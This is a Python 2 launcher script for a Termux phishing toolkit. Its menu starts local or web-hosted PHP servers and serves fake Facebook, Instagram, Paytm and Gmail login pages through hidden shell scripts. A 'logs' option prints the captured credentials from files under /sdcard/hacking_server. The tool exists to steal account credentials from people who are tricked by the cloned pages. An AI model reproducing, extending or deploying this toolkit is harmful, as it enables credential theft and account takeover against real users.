#!/bin/env python2
import os
while 1:
	red = "\033[1;31m"
	os.system("clear")
	print "\033[1;39m                 ============================"
	print "                 |       PHP SERVER         |"
	print "                 |    IN ANDROID TERMUX     |"
	print "                 |  [+]  coded by sachin    |"
	print "                 ============================"
	print ""
	print "                 1 - Localhost"
	print "                 2 - Webhost"
	print "                 3 - Phishing server"
	print "                 4 - logs"
	print ""
	print "                 99 - exit"
	print red
	x = raw_input(" 		[+] Select >> \033[1;32m")
	if x == "1":
		os.system("clear")
		os.system("sh .localhost.sh")
	elif x=="2":
		os.system("clear")
		os.system("sh .webhost.sh")
	elif x == "3":
		while 1:
		  try:
			os.system("clear")
			os.system("figlet +Phishing+")
			print '    ============================='
			print "          1 - Facebook page"
			print "          2 - Instagram page"
			print "          3 - Paytm"
			print "          4 - Gmail"
			print ""
			print "          99 - back menue"
			print "    ============================="
			print "\033[1;36m"
			y = raw_input("Select your option :- \033[1;35m")
			if y == "1":
				os.system("sh .facebook.sh")
			if y == "2":
				os.system("sh .instagram.sh")
			elif y== "99":
				break
		  except KeyboardInterrupt:
			print ""
			print "Exiting ...."
			os.system("sleep 2")
	elif x == "4":
		while 1:
			print ''
			print "===================="
			print "1 - facebook list "
			print "2 - instagram list"
			print ''
			print "99 - menue "
			print ''
			z = raw_input("Select option :- ")
			print ''
			if z =="1":
				os.system("cat /sdcard/hacking_server/facebook/php/file.txt")
			elif z =="2":
				os.system("cat /sdcard/hacking_server/facebook/php/logs.txt")
			elif z == "99":
				break
	elif x == "99":
		os.system("clear")
		break
